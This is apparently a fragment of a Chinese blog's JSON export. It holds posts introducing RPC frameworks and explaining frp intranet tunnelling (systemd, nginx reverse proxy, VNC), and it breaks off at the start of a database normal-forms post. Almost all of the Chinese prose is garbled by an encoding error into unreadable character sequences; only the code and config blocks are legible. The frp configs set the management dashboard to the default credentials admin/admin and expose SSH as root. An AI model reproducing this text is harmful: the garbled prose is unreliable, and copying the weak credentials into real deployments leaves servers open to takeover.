RPCï¼‰æ˜¯ä¸€ä¸ªè®¡ç®—æœºé€šä¿¡åè®®ã€‚è¯¥åè®®å…è®¸è¿è¡Œäºä¸€å°è®¡ç®—æœºçš„ç¨‹åºè°ƒç”¨å¦ä¸€ä¸ªåœ°å€ç©ºé—´ï¼ˆé€šå¸¸ä¸ºä¸€ä¸ªå¼€æ”¾ç½‘ç»œçš„ä¸€å°è®¡ç®—æœºï¼‰çš„å­ç¨‹åºï¼Œè€Œç¨‹åºå‘˜å°±åƒè°ƒç”¨æœ¬åœ°ç¨‹åºä¸€æ ·ï¼Œæ— éœ€é¢å¤–åœ°ä¸ºè¿™ä¸ªäº¤äº’ä½œç”¨ç¼–ç¨‹ï¼ˆæ— éœ€å…³æ³¨ç»†èŠ‚ï¼‰ã€‚RPCæ˜¯ä¸€ç§æœåŠ¡å™¨-å®¢æˆ·ç«¯ï¼ˆClient/Serverï¼‰æ¨¡å¼ï¼Œç»å…¸å®ç°æ˜¯ä¸€ä¸ªé€šè¿‡å‘é€è¯·æ±‚-æ¥å—å›åº”è¿›è¡Œä¿¡æ¯äº¤äº’çš„ç³»ç»Ÿã€‚\n\n![1](rpcçš„ä»‹ç»/4.jpg)\n\n<!-- more -->\n\n\n### 1.1 å¸¸è§çš„ RPCæ¡†æ¶\n\nRPC æ˜¯ä¸€ç§æŠ€æœ¯æ€æƒ³è€Œéä¸€ç§è§„èŒƒæˆ–åè®®ï¼Œå¸¸è§ RPCæ¡†æ¶æœ‰ï¼š\n\n[Dubbo](http://dubbo.io/) æ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€ä¸ªJavaé«˜æ€§èƒ½ä¼˜ç§€çš„æœåŠ¡æ¡†æ¶ï¼Œä½¿å¾—åº”ç”¨å¯é€šè¿‡é«˜æ€§èƒ½çš„ RPC å®ç°æœåŠ¡çš„è¾“å‡ºå’Œè¾“å…¥åŠŸèƒ½ï¼Œå¯ä»¥å’Œ Springæ¡†æ¶æ— ç¼é›†æˆã€‚\n\n[Motan](https://github.com/weibocom/motan)æ˜¯æ–°æµªå¾®åšå¼€æºçš„ä¸€ä¸ªJava æ¡†æ¶ã€‚å®ƒè¯ç”Ÿçš„æ¯”è¾ƒæ™šï¼Œèµ·äº2013å¹´ï¼Œ2016å¹´5æœˆå¼€æºã€‚Motan åœ¨å¾®åšå¹³å°ä¸­å·²ç»å¹¿æ³›åº”ç”¨ï¼Œæ¯å¤©ä¸ºæ•°ç™¾ä¸ªæœåŠ¡å®Œæˆè¿‘åƒäº¿æ¬¡çš„è°ƒç”¨ã€‚\n\n[rpcx](https://github.com/smallnest/rpcx)æ˜¯Goè¯­è¨€ç”Ÿæ€åœˆçš„Dubboï¼Œ æ¯”Dubboæ›´è½»é‡ï¼Œå®ç°äº†Dubboçš„è®¸å¤šç‰¹æ€§ï¼Œå€ŸåŠ©äºGoè¯­è¨€ä¼˜ç§€çš„å¹¶å‘ç‰¹æ€§å’Œç®€æ´è¯­æ³•ï¼Œå¯ä»¥ä½¿ç”¨è¾ƒå°‘çš„ä»£ç å®ç°åˆ†å¸ƒå¼çš„RPCæœåŠ¡ã€‚\n\n[gRPC](http://www.grpc.io/)æ˜¯Googleå¼€å‘çš„é«˜æ€§èƒ½ã€é€šç”¨çš„å¼€æºRPCæ¡†æ¶ï¼Œå…¶ç”±Googleä¸»è¦é¢å‘ç§»åŠ¨åº”ç”¨å¼€å‘å¹¶åŸºäºHTTP/2åè®®æ ‡å‡†è€Œè®¾è®¡ï¼ŒåŸºäºProtoBuf(Protocol Buffers)åºåˆ—åŒ–åè®®å¼€å‘ï¼Œä¸”æ”¯æŒä¼—å¤šå¼€å‘è¯­è¨€ã€‚æœ¬èº«å®ƒä¸æ˜¯åˆ†å¸ƒå¼çš„ï¼Œæ‰€ä»¥è¦å®ç°ä¸Šé¢çš„æ¡†æ¶çš„åŠŸèƒ½éœ€è¦è¿›ä¸€æ­¥çš„å¼€å‘ã€‚\n\n[thrift](https://thrift.apache.org/)æ˜¯Apacheçš„ä¸€ä¸ªè·¨è¯­è¨€çš„é«˜æ€§èƒ½çš„æœåŠ¡æ¡†æ¶ï¼Œä¹Ÿå¾—åˆ°äº†å¹¿æ³›çš„åº”ç”¨ã€‚\n\n|æ¡†æ¶| Dubbo            | Montan | rpcx                              | gRPC |\n| :--------------- | :----- | :-------------------------------- | :--- | :----------------- |\n| å¼€å‘è¯­è¨€         | Java   | Java                              | Go   | è·¨è¯­è¨€             |\n| åˆ†å¸ƒå¼(æœåŠ¡æ²»ç†) | âˆš      | âˆš                                 | âˆš    | Ã—                  |\n| å¤šåºåˆ—åŒ–æ¡†æ¶æ”¯æŒ | âˆš      | âˆš (å½“å‰æ”¯æŒHessian2ã€Json,å¯æ‰©å±•) | âˆš    | Ã— (åªæ”¯æŒprotobuf) |\n| å¤šç§æ³¨å†Œä¸­å¿ƒ     | âˆš      | âˆš                                 | âˆš    | Ã—                  |\n| ç®¡ç†ä¸­å¿ƒ         | âˆš      | âˆš                                 | âˆš    | Ã—                  |\n| è·¨ç¼–ç¨‹è¯­è¨€       | Ã—      | Ã— (æ”¯æŒphp clientå’ŒC server)      | Ã—    | âˆš                  |\n\n### 1.2 å®Œæ•´çš„ RPC æ¡†æ¶\n\nåœ¨ä¸€ä¸ªå…¸å‹ RPC çš„ä½¿ç”¨åœºæ™¯ä¸­ï¼ŒåŒ…å«äº†æœåŠ¡å‘ç°ã€è´Ÿè½½ã€å®¹é”™ã€ç½‘ç»œä¼ è¾“ã€åºåˆ—åŒ–ç­‰ç»„ä»¶ï¼Œå…¶ä¸­â€œRPC åè®®â€å°±æŒ‡æ˜äº†ç¨‹åºå¦‚ä½•è¿›è¡Œç½‘ç»œä¼ è¾“å’Œåºåˆ—åŒ–ã€‚\n\n![1](rpcçš„ä»‹ç»/1.jpg)\n\n### 1.3 RPC æ ¸å¿ƒä¹‹åŠŸèƒ½å®ç°\n\næ‰€ä»¥ï¼Œè¦å®ç°ä¸€ä¸ª RPC æ¡†æ¶ï¼Œåªéœ€è¦æŠŠä»¥ä¸‹ä¸‰ç‚¹å®ç°äº†å°±åŸºæœ¬å®Œæˆäº†ï¼š\n\n- æœåŠ¡å¯»å€Call ID æ˜ å°„ï¼šå¯ä»¥ç›´æ¥ä½¿ç”¨å‡½æ•°å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ•´æ•° IDã€‚æ˜ å°„è¡¨ä¸€èˆ¬å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ã€‚\n\n- æ•°æ®æµçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼šå¯ä»¥è‡ªå·±å†™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Protobuf æˆ–è€… FlatBuffers ä¹‹ç±»çš„ã€‚\n\n- ç½‘ç»œä¼ è¾“ï¼šå°½ç®¡å¤§éƒ¨åˆ† RPC æ¡†æ¶éƒ½ä½¿ç”¨ TCP åè®®ï¼Œä½†å…¶å® UDP ä¹Ÿå¯ä»¥ï¼Œè€Œ gRPC å¹²è„†å°±ç”¨äº† HTTP2ã€‚ä¹Ÿå¯ä»¥è‡ªå·±å†™ Socketï¼Œæˆ–è€…ç”¨ Asioï¼ŒZeroMQï¼ŒNetty ä¹‹ç±»ã€‚\n\n  \n\n##### 1.3.1 æœåŠ¡å¯»å€\n\næœåŠ¡å¯»å€å¯ä»¥ä½¿ç”¨ Call ID æ˜ å°„ã€‚åœ¨æœ¬åœ°è°ƒç”¨ä¸­ï¼Œå‡½æ•°ä½“æ˜¯ç›´æ¥é€šè¿‡å‡½æ•°æŒ‡é’ˆæ¥æŒ‡å®šçš„ï¼Œä½†æ˜¯åœ¨è¿œç¨‹è°ƒç”¨ä¸­ï¼Œå‡½æ•°æŒ‡é’ˆæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºä¸¤ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´æ˜¯å®Œå…¨ä¸ä¸€æ ·çš„ã€‚\n\næ‰€ä»¥åœ¨ RPC ä¸­ï¼Œæ‰€æœ‰çš„å‡½æ•°éƒ½å¿…é¡»æœ‰è‡ªå·±çš„ä¸€ä¸ª IDã€‚è¿™ä¸ª ID åœ¨æ‰€æœ‰è¿›ç¨‹ä¸­éƒ½æ˜¯å”¯ä¸€ç¡®å®šçš„ã€‚å®¢æˆ·ç«¯åœ¨åšè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æ—¶ï¼Œå¿…é¡»é™„ä¸Šè¿™ä¸ª IDã€‚ç„¶åæˆ‘ä»¬è¿˜éœ€è¦åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åˆ†åˆ«ç»´æŠ¤ä¸€ä¸ªå‡½æ•°å’ŒCall IDçš„å¯¹åº”è¡¨ã€‚\n\nå½“å®¢æˆ·ç«¯éœ€è¦è¿›è¡Œè¿œç¨‹è°ƒç”¨æ—¶ï¼Œå®ƒå°±æŸ¥ä¸€ä¸‹è¿™ä¸ªè¡¨ï¼Œæ‰¾å‡ºç›¸åº”çš„ Call IDï¼Œç„¶åæŠŠå®ƒä¼ ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¹Ÿé€šè¿‡æŸ¥è¡¨ï¼Œæ¥ç¡®å®šå®¢æˆ·ç«¯éœ€è¦è°ƒç”¨çš„å‡½æ•°ï¼Œç„¶åæ‰§è¡Œç›¸åº”å‡½æ•°çš„ä»£ç ã€‚\n\n> å®ç°æ–¹å¼ï¼šæœåŠ¡æ³¨å†Œä¸­å¿ƒã€‚\n\nè¦è°ƒç”¨æœåŠ¡ï¼Œé¦–å…ˆä½ éœ€è¦ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒå»æŸ¥è¯¢å¯¹æ–¹æœåŠ¡éƒ½æœ‰å“ªäº›å®ä¾‹ã€‚Dubbo çš„æœåŠ¡æ³¨å†Œä¸­å¿ƒæ˜¯å¯ä»¥é…ç½®çš„ï¼Œå®˜æ–¹æ¨èä½¿ç”¨ Zookeeperã€‚\n\nå®ç°æ¡ˆä¾‹ï¼šRMI(Remote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨)ä¹Ÿå°±æ˜¯ RPC æœ¬èº«çš„å®ç°æ–¹å¼ã€‚\n\n![1](rpcçš„ä»‹ç»/2.jpg)\n\n\n\nRegistry(æœåŠ¡å‘ç°)ï¼šå€ŸåŠ© JNDI å‘å¸ƒå¹¶è°ƒç”¨äº† RMI æœåŠ¡ã€‚å®é™…ä¸Šï¼ŒJNDI å°±æ˜¯ä¸€ä¸ªæ³¨å†Œè¡¨ï¼ŒæœåŠ¡ç«¯å°†æœåŠ¡å¯¹è±¡æ”¾å…¥åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œå®¢æˆ·ç«¯ä»æ³¨å†Œè¡¨ä¸­è·å–æœåŠ¡å¯¹è±¡ã€‚\n\nRMI æœåŠ¡åœ¨æœåŠ¡ç«¯å®ç°ä¹‹åéœ€è¦æ³¨å†Œåˆ° RMI Server ä¸Šï¼Œç„¶åå®¢æˆ·ç«¯ä»æŒ‡å®šçš„ RMI åœ°å€ä¸Š Lookup æœåŠ¡ï¼Œè°ƒç”¨è¯¥æœåŠ¡å¯¹åº”çš„æ–¹æ³•å³å¯å®Œæˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚\n\nRegistry æ˜¯ä¸ªå¾ˆé‡è¦çš„åŠŸèƒ½ï¼Œå½“æœåŠ¡ç«¯å¼€å‘å®ŒæœåŠ¡ä¹‹åï¼Œè¦å¯¹å¤–æš´éœ²ï¼Œå¦‚æœæ²¡æœ‰æœåŠ¡æ³¨å†Œï¼Œåˆ™å®¢æˆ·ç«¯æ˜¯æ— ä»è°ƒç”¨çš„ï¼Œå³ä½¿æœåŠ¡ç«¯çš„æœåŠ¡å°±åœ¨é‚£é‡Œã€‚\n\n\n\n##### 1.3.2 åºåˆ—åŒ–å’Œååºåˆ—åŒ–\n\nå®¢æˆ·ç«¯æ€ä¹ˆæŠŠå‚æ•°å€¼ä¼ ç»™è¿œç¨‹çš„å‡½æ•°å‘¢?åœ¨æœ¬åœ°è°ƒç”¨ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå‚æ•°å‹åˆ°æ ˆé‡Œï¼Œç„¶åè®©å‡½æ•°è‡ªå·±å»æ ˆé‡Œè¯»å°±è¡Œã€‚\n\nä½†æ˜¯åœ¨è¿œç¨‹è¿‡ç¨‹è°ƒç”¨æ—¶ï¼Œå®¢æˆ·ç«¯è·ŸæœåŠ¡ç«¯æ˜¯ä¸åŒçš„è¿›ç¨‹ï¼Œä¸èƒ½é€šè¿‡å†…å­˜æ¥ä¼ é€’å‚æ•°ã€‚è¿™æ—¶å€™å°±éœ€è¦å®¢æˆ·ç«¯æŠŠå‚æ•°å…ˆè½¬æˆä¸€ä¸ªå­—èŠ‚æµï¼Œä¼ ç»™æœåŠ¡ç«¯åï¼Œå†æŠŠå­—èŠ‚æµè½¬æˆè‡ªå·±èƒ½è¯»å–çš„æ ¼å¼ã€‚\n\nåªæœ‰äºŒè¿›åˆ¶æ•°æ®æ‰èƒ½åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å®šä¹‰æ˜¯ï¼š\n\n- å°†å¯¹è±¡è½¬æ¢æˆäºŒè¿›åˆ¶æµçš„è¿‡ç¨‹å«åšåºåˆ—åŒ–\n- å°†äºŒè¿›åˆ¶æµè½¬æ¢æˆå¯¹è±¡çš„è¿‡ç¨‹å«åšååºåˆ—åŒ–\n\nè¿™ä¸ªè¿‡ç¨‹å«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚åŒç†ï¼Œä»æœåŠ¡ç«¯è¿”å›çš„å€¼ä¹Ÿéœ€è¦åºåˆ—åŒ–ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\n\n\n\n##### 1.3.3 ç½‘ç»œä¼ è¾“\n\nç½‘ç»œä¼ è¾“ï¼šè¿œç¨‹è°ƒç”¨å¾€å¾€ç”¨åœ¨ç½‘ç»œä¸Šï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ˜¯é€šè¿‡ç½‘ç»œè¿æ¥çš„ã€‚\n\næ‰€æœ‰çš„æ•°æ®éƒ½éœ€è¦é€šè¿‡ç½‘ç»œä¼ è¾“ï¼Œå› æ­¤å°±éœ€è¦æœ‰ä¸€ä¸ªç½‘ç»œä¼ è¾“å±‚ã€‚ç½‘ç»œä¼ è¾“å±‚éœ€è¦æŠŠ Call ID å’Œåºåˆ—åŒ–åçš„å‚æ•°å­—èŠ‚æµä¼ ç»™æœåŠ¡ç«¯ï¼Œç„¶åå†æŠŠåºåˆ—åŒ–åçš„è°ƒç”¨ç»“æœä¼ å›å®¢æˆ·ç«¯ã€‚\n\nåªè¦èƒ½å®Œæˆè¿™ä¸¤è€…çš„ï¼Œéƒ½å¯ä»¥ä½œä¸ºä¼ è¾“å±‚ä½¿ç”¨ã€‚å› æ­¤ï¼Œå®ƒæ‰€ä½¿ç”¨çš„åè®®å…¶å®æ˜¯ä¸é™çš„ï¼Œèƒ½å®Œæˆä¼ è¾“å°±è¡Œã€‚\n\nå°½ç®¡å¤§éƒ¨åˆ† RPC æ¡†æ¶éƒ½ä½¿ç”¨ TCP åè®®ï¼Œä½†å…¶å® UDP ä¹Ÿå¯ä»¥ï¼Œè€Œ gRPC å¹²è„†å°±ç”¨äº† HTTP2ã€‚\n\nTCP çš„è¿æ¥æ˜¯æœ€å¸¸è§çš„ï¼Œç®€è¦åˆ†æåŸºäº TCP çš„è¿æ¥ï¼šé€šå¸¸ TCP è¿æ¥å¯ä»¥æ˜¯æŒ‰éœ€è¿æ¥(éœ€è¦è°ƒç”¨çš„æ—¶å€™å°±å…ˆå»ºç«‹è¿æ¥ï¼Œè°ƒç”¨ç»“æŸåå°±ç«‹é©¬æ–­æ‰)ï¼Œä¹Ÿå¯ä»¥æ˜¯é•¿è¿æ¥(å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å»ºç«‹èµ·è¿æ¥ä¹‹åä¿æŒé•¿æœŸæŒæœ‰ï¼Œä¸ç®¡æ­¤æ—¶æœ‰æ— æ•°æ®åŒ…çš„å‘é€ï¼Œå¯ä»¥é…åˆå¿ƒè·³æ£€æµ‹æœºåˆ¶å®šæœŸæ£€æµ‹å»ºç«‹çš„è¿æ¥æ˜¯å¦å­˜æ´»æœ‰æ•ˆ)ï¼Œå¤šä¸ªè¿œç¨‹è¿‡ç¨‹è°ƒç”¨å…±äº«åŒä¸€ä¸ªè¿æ¥ã€‚\n\n\n\n# 2. é—®é¢˜æ€»ç»“\n\n### 2.1 RPC å’Œ HTTP åŒºåˆ«\n\n+ HTTPå’ŒRPCåŒä¸€çº§åˆ«ï¼Œè¿˜æ˜¯è¢«RPCåŒ…å«ï¼Ÿ\n\n  \n\n  ![1](rpcçš„ä»‹ç»/3.jpg)\n\n  ä¸Šå›¾æ˜¯ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„å…³ç³»å›¾ï¼Œè¿™æ—¶æˆ‘ä»¬å‘ç°HTTPï¼ˆå›¾ä¸­è“è‰²æ¡†ï¼‰å‡ºç°äº†ä¸¤æ¬¡ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯å’ŒRPCå¹¶åˆ—çš„ï¼Œéƒ½æ˜¯è·¨åº”ç”¨è°ƒç”¨æ–¹æ³•çš„è§£å†³æ–¹æ¡ˆï¼›å¦ä¸€ä¸ªåˆ™æ˜¯è¢«RPCåŒ…å«çš„ï¼Œæ˜¯RPCé€šä¿¡è¿‡ç¨‹çš„å¯é€‰åè®®ä¹‹ä¸€ã€‚\n\n  å› æ­¤ï¼Œ**é—®é¢˜çš„ç­”æ¡ˆæ˜¯éƒ½å¯¹ã€‚çœ‹æŒ‡çš„æ˜¯å“ªä¸€ä¸ªè“è‰²æ¡†ã€‚**\n\n\n\n+ Restfulä¹Ÿå±äºRPCä¹ˆï¼Ÿ\n\n  ç¬¬äºŒä¸ªé—®é¢˜æ˜¯åœ¨é—®è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆçº¢è‰²æ¡†ï¼‰æ˜¯ä¸æ˜¯åŒ…å«äº†Restfulï¼ˆé»„è‰²æ¡†ï¼‰ï¼Œè¿™ç§ç†è§£çš„å…³é”®åœ¨äºå¯¹RPCçš„ç†è§£ã€‚\n\n  RPCå­—é¢ç†è§£æ˜¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œå³åœ¨ä¸€ä¸ªåº”ç”¨ä¸­è°ƒç”¨å¦ä¸€ä¸ªåº”ç”¨çš„æ–¹æ³•ã€‚é‚£Restfulæ˜¯æ»¡è¶³çš„ï¼Œé€šè¿‡å®ƒå¯ä»¥å®ç°åœ¨ä¸€ä¸ªåº”ç”¨ä¸­è°ƒç”¨å¦ä¸€ä¸ªåº”ç”¨çš„æ–¹æ³•ã€‚\n\n  ä½†æ˜¯ï¼Œä¸Šè¿°ç†è§£ä½¿å¾—RPCçš„å®šä¹‰è¿‡äºå®½æ³›ã€‚RPCé€šå¸¸ç‰¹æŒ‡åœ¨ä¸€ä¸ªåº”ç”¨ä¸­è°ƒç”¨å¦ä¸€ä¸ªåº”ç”¨çš„æ¥å£è€Œå®ç°çš„è¿œç¨‹è°ƒç”¨ï¼Œå³çº¢è‰²æ¡†æ‰€æŒ‡çš„èŒƒå›´ã€‚è¿™æ ·ï¼ŒRPCæ˜¯ä¸åŒ…å«Restfulçš„ã€‚\n\n  \n\n# 3. å‚è€ƒèµ„æ–™\n\n+ [èŠ±äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œæˆ‘ç»ˆäºæŠŠRPCæ¡†æ¶æ•´æ˜ç™½äº†ï¼](https://developer.51cto.com/art/201906/597963.htm)\n\n","tags":["rpc"],"categories":["RPC"]},{"title":"frpå†…ç½‘ç©¿é€çš„å®è·µ","url":"%2Fp%2Fcc6fa0e8.html","content":"\n\n\n### 0. ä¸ºä»€ä¹ˆå†…ç½‘ç©¿é€\n\nä»å…¬ç½‘ä¸­è®¿é—®è‡ªå·±çš„ç§æœ‰è®¾å¤‡å‘æ¥æ˜¯ä¸€ä»¶éš¾äº‹å„¿ã€‚\n\nè‡ªå·±çš„ä¸»åŠ›å°å¼æœºã€NASç­‰ç­‰è®¾å¤‡ï¼Œå®ƒä»¬å¯èƒ½å¤„äºè·¯ç”±å™¨åï¼Œæˆ–è€…è¿è¥å•†å› ä¸ºIPåœ°å€çŸ­ç¼ºä¸ç»™ä½ åˆ†é…å…¬ç½‘IPåœ°å€ã€‚å¦‚æœæˆ‘ä»¬æƒ³ç›´æ¥è®¿é—®åˆ°è¿™äº›è®¾å¤‡ï¼ˆè¿œç¨‹æ¡Œé¢ï¼Œè¿œç¨‹æ–‡ä»¶ï¼ŒSSHç­‰ç­‰ï¼‰ï¼Œä¸€èˆ¬æ¥è¯´è¦é€šè¿‡ä¸€äº›è½¬å‘æˆ–è€…P2Pç»„ç½‘è½¯ä»¶çš„å¸®åŠ©ã€‚\n\n<!-- more -->\n\n\n\n### 1. å®‰è£…é…ç½® frp\n\nhttps://github.com/fatedier/frp/releases ä¸‹è½½æœ€æ–°çš„release\n\n##### 1.1æœåŠ¡ç«¯é…ç½®\n\n```bash\nsudo cp systemd/frps.service /lib/systemd/system/\n\n#  /usr/bin/frps -c /etc/frp/frps.ini\n# æˆ‘ä»¬æŒ‰ç…§ service å†…çš„é…ç½®æŠŠæ–‡ä»¶æ‹·è´åˆ°ç›¸åº”çš„åœ°æ–¹\n\nsudo cp frps /usr/bin/frps\nsudo mkdir /etc/frp/\nsudo cp frps.ini /etc/frp/frps.ini\n\n# ç¼–è¾‘frps.ini\n\n\n# å¼€å¯ service\nsudo systemctl start frps\nsudo systemctl enable frps\n```\n\n\n\n##### 1.2 å®¢æˆ·ç«¯\n\n```bash\nsudo cp systemd/frpc.service /lib/systemd/system/\n\nsudo cp frpc /usr/bin/frpc\nsudo mkdir /etc/frp/\nsudo cp frpc.ini /etc/frp/frpc.ini\n\n#ç¼–è¾‘frpc.ini\n\n#1. ä¿®æ”¹server_addrä¸ºæœåŠ¡ç«¯å…¬ç½‘IP\n\n\n# å¼€å¯ service\nsudo systemctl start frpc\nsudo systemctl enable frpc\n```\n\n\n\n##### 1.3 æµ‹è¯•\n\nä¸»é¢˜frpcé‡Œé¢æœ‰sshé…ç½®, æ‰€ä»¥æˆ‘ä»¬é€šè¿‡ ssh è®¿é—®å†…ç½‘æœºå™¨ï¼š\n\n```bash\nssh -p 6000 root@49.234.15.70\n\n# ä¸ºäº†æ–¹ä¾¿, æˆ‘ä»¬å¯ä»¥åœ¨~/.ssh/config é…ç½®ä¸‹é¢çš„è¯\n\nhost box\n    Hostname 49.234.15.70\n    Port 6000\n    user root\n```\n\n\n\n### 2. è‡ªå®šä¹‰åŸŸåè®¿é—®å†…ç½‘çš„ web æœåŠ¡\n\næœ‰æ—¶æƒ³è¦è®©å…¶ä»–äººé€šè¿‡åŸŸåè®¿é—®æˆ–è€…æµ‹è¯•æˆ‘ä»¬åœ¨æœ¬åœ°æ­å»ºçš„ web æœåŠ¡ï¼Œä½†æ˜¯ç”±äºæœ¬åœ°æœºå™¨æ²¡æœ‰å…¬ç½‘ IPï¼Œæ— æ³•å°†åŸŸåè§£æåˆ°æœ¬åœ°çš„æœºå™¨ï¼Œé€šè¿‡ frp å°±å¯ä»¥å®ç°è¿™ä¸€åŠŸèƒ½ï¼Œä»¥ä¸‹ç¤ºä¾‹ä¸º http æœåŠ¡ï¼Œhttps æœåŠ¡é…ç½®æ–¹æ³•ç›¸åŒï¼Œ vhost_http_port æ›¿æ¢ä¸º vhost_https_portï¼Œ type è®¾ç½®ä¸º https å³å¯ã€‚\n\n\n\n##### 2.1 ä¿®æ”¹ frps.ini\n\nè®¾ç½® http è®¿é—®ç«¯å£ä¸º 8080ï¼š\n\n```ini\n# frps.ini\n[common]\nbind_port = 7000\nvhost_http_port = 8080\n```\n\n\n\n##### 2.2 å¯åŠ¨ frpsï¼š\n\n```bash\nsudo systemctl start frps\n```\n\n\n\n##### 2.3 ä¿®æ”¹frpc.ini\n\nä¿®æ”¹ frpc.ini æ–‡ä»¶ï¼Œå‡è®¾ frps æ‰€åœ¨çš„æœåŠ¡å™¨çš„ IP ä¸º x.x.x.xï¼Œlocal_port ä¸ºæœ¬åœ°æœºå™¨ä¸Š web æœåŠ¡å¯¹åº”çš„ç«¯å£, ç»‘å®šè‡ªå®šä¹‰åŸŸå `www.yourdomain.com`:\n\n\n\n```ini\n# frpc.ini\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[web]\ntype = http\nlocal_port = 80\ncustom_domains = www.yourdomain.com\n```\n\n\n\n##### 2.4 å¯åŠ¨ frpcï¼š\n\n```bash\nsudo systemctl start frpc\n```\n\n\n\n##### 2.5 ç»‘å®šåŸŸåæ˜ å°„\n\nå°† `www.yourdomain.com` çš„åŸŸå A è®°å½•è§£æåˆ° IP `x.x.x.x`ï¼Œå¦‚æœæœåŠ¡å™¨å·²ç»æœ‰å¯¹åº”çš„åŸŸåï¼Œä¹Ÿå¯ä»¥å°† CNAME è®°å½•è§£æåˆ°æœåŠ¡å™¨åŸå…ˆçš„åŸŸåã€‚\n\né€šè¿‡æµè§ˆå™¨è®¿é—® `http://www.yourdomain.com:8080` å³å¯è®¿é—®åˆ°å¤„äºå†…ç½‘æœºå™¨ä¸Šçš„ web æœåŠ¡ã€‚\n\n\n\n### 3. frp ç®¡ç†é¢æ¿\n\næœåŠ¡ç«¯ frps é…ç½®å¦‚ä¸‹:\n\n```ini\n[common]\nbind_port = 7000\ndashboard_port = 5000\ndashboard_user = admin\ndashboard_pwd = admin\nvhost_http_port = 5001\n```\n\nç„¶åæˆ‘ä»¬é€šè¿‡ ip:5000,å³å¯ä»¥è®¿é—®åˆ° web ç®¡ç†ç•Œé¢.\n\n\n\n### 4. nginx åå‘ä»£ç†è¿›è¡Œæ— ç«¯å£è®¿é—®\n\n##### 4.1 frp ç›¸åº”é…ç½®\n\n+ frps\n\n  ```ini\n  [common]\n  bind_port = 7000\n  dashboard_port = 5000\n  dashboard_user = admin\n  dashboard_pwd = admin\n  vhost_http_port = 5001\n  ```\n\n  \n\n+ frpc\n\n  ```ini\n  [web]\n  type = http\n  local_port = 80\n  custom_domains = box.frp.liuvv.com\n  ```\n\n\n\n##### 4.2 åœ¨æœåŠ¡ç«¯æ¶è®¾ nginx\n\n1ã€ frp.liuvv.com åšAè®°å½•ï¼Œè§£æè‡³IPï¼›\n\n2ã€ *.frp.liuvv.com åšCNAMEè®°å½•ï¼Œè§£æè‡³ frp.liuvv.com;\n\n3ã€ é…ç½®nginxåå‘ä»£ç†,å°†æ¥è‡ª*.frp.liuvv.comçš„80ç«¯å£è¯·æ±‚ï¼Œåˆ†å‘è‡³frpæœåŠ¡å™¨httpè¯·æ±‚çš„ç›‘å¬ç«¯å£ã€‚\n\n```nginx\nserver {\n\n    listen 80;\n\n    server_name frp.liuvv.com;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5000;# dashboard\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n\nserver {\n\n    listen 80;\n\n    server_name *.frp.liuvv.com;\n\n    access_log /var/log/nginx/frp_access.log;\n\n    error_log /var/log/nginx/frp_error.log;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5001;# vhost_http\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n```\n\n\n\n### 5.  è¿œç¨‹æ¡Œé¢è¿æ¥å±€åŸŸç½‘mac\n\nmacå»ä¸‹è½½darwin_amd64,  ç„¶åå¯åŠ¨å®¢æˆ·ç«¯ frpc\n\n##### 5.1  å¼€å¯å±å¹•å…±äº«\n\nåœ¨ç³»ç»Ÿè®¾ç½®->å…±äº«->å¼€å¯å±å¹•å…±äº«\n\nå³å¼€å¯äº† vnc æœåŠ¡\n\n\n\n##### 5.2 ä¿®æ”¹frpcé…ç½®\n\n```ini\n[common] \nserver_addr = 49.234.15.70\nserver_port = 7000\n\n[vnc] \ntype = tcp \nlocal_ip = 127.0.0.1 \nlocal_port = 5900 \nremote_port = 35900 \nuse_encryption = true \nuse_compression = true\n```\n\n\n\n##### 5.3 è¿æ¥è¿œç¨‹\n\nåœ¨ finder, cmd+k, è¿›è¡Œè¿æ¥\n\n```ini\nvnc://49.234.15.70:35900\n```\n\n\n\n### 6. å‚è€ƒèµ„æ–™:\n\n+ https://github.com/fatedier/frp/blob/master/README_zh.md\n\n+ https://www.iyuu.cn/archives/286/\n+ [å®ç°MACè¿œç¨‹æ¡Œé¢](http://yuqiangcoder.com/2019/11/22/frp-å†…ç½‘ç©¿é€-å®ç°MACè¿œç¨‹æ¡Œé¢.html)","tags":["frp"],"categories":["ç³»ç»Ÿ"]},{"title":"æ•°æ®åº“èŒƒå¼å’Œå‡½æ•°ä¾èµ–","url":"%2Fp%2F2e33702e.html","content":"\n\n\n# 1. å‡½æ•°ä¾èµ–\n\n## 1.1 å‡½æ•°ä¾èµ–(æœ‰æˆ‘å°±èƒ½å†³å®šä½ 